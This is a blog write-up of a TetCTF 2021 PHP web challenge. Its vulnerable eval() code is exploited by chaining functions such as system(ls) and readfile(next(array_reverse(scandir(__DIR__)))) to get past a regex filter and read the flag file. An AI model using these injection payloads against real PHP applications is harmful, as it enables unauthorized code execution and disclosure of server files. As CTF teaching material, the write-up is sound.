---
title: "Reading files in PHP without numbers, quotes, spaces and most other symbols."
excerpt: "Writeup for the HPNY Web chall from [TetCTF 2021](https://ctftime.org/event/1213)."
date: 2021-01-04T16:23:30-03:00
categories:
  - Cybersecurity
tags:
  - Web
  - PHP
  - TetCTF 2021
  - CTF
---

This chall had a page that allowed a user to get a "happy new year" phrase in different languages, as well as getting a lucky number. The user could choose which function he wanted by passing it as a query parameter in the URL. The PHP code was given:

```php
<?php

function get_lucky_word() {
    $words = array("Chuc mung nam moi", "gongxifacai", "happy new year!", "bonne année", "Akemashite omedeto gozaimasu", "Seh heh bok mahn ee bahd euh sae yo", "kimochi", "Feliz Año Nuevo", "S novim godom", "Gelukkig Nieuwjaar", "selamat tahun baru", "iniya puthandu nal Vazhthukkal");
    return $words[array_rand($words)];
}

function get_lucky_number() {
    $numb = rand(0,100);
    return strval($numb);
}


if(!isset($_GET["roll"])) {
    show_source(__FILE__);
}
else
{
    $wl = preg_match('/^[a-z\(\)\_\.]+$/i', $_GET["roll"]);

    if($wl === 0 || strlen($_GET["roll"]) > 50) {
        die("bumbadum badum");
    }
    eval("echo ".$_GET["roll"]."();");
}

?>
```

For example, if the user wanted a lucky number: http://139.180.155.171:8003/?roll=get_lucky_number

As can be seen in the code, the "value" parameter is passed to `eval()`, which is a good indicator of a code execution vulnerability. The problem is the regex that comes just before is filtering a lot of characters from the input. So the payload cannot have numbers, spaces, quotes, and most other symbols. Only letters, parenthesis, underscores, and dots were allowed.

## The solution

At first, I thought there would be a way to bypass the regex in a way that I could use the forbidden characters. I achieved it by transforming the "roll" parameter in an array: `http://139.180.155.171:8003/?roll[]="som3 payload"`. This payload bypassed the regex. However, the `eval()` just printed `Array` on the screen, and I could not find a way to use the content inside the array. It was a dead end.

Next, I got some code execution with `roll=system(ls)`, which returned the content of the directory in the server:

```
fl4g_here_but_can_you_get_it_hohoho.php
index.php
```

I don't know why it worked without wrapping `ls` in quotes, but ok. Now I had another problem: how to read the file, as it has a number in its name. Also, without using quotes.

After a lot of time, I got this solution: `roll=readfile(next(array_reverse(scandir(__DIR__))))`. What it is doing is:

- `__DIR__`: It's a string that contains the path of the current directory. Same thing as `getcwd()`.
- `scandir(__DIR__)`: Returns an array where each entry is the name of a file in the `__DIR__` folder.

This looks great. However, `scandir(__DIR__)` returned the following array: `array(4) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(39) "fl4g_here_but_can_you_get_it_hohoho.php" [3]=> string(9) "index.php" }` (can be checked with the payload `roll=var_dump(scandir(__DIR__))`). The file with the flag is the penultimate element of the array. How can I get this specific element in the array without using `[]`?

- `array_reverse(scandir(__DIR__))`: I reverse the array, so now the file is the second element, not the penultimate anymore.
- `next(array_reverse(scandir(__DIR__)))`: This got the second element of the array as a string.
- `readfile(next(array_reverse(scandir(__DIR__))))`: Finally, I could read the file content!

```
<?php

$flagsssssssss = "TetCTF{lixi_50k_<3_vina_*100*25926415724382#}";

?>
```

Really nice challenge. Kudos to the creator.
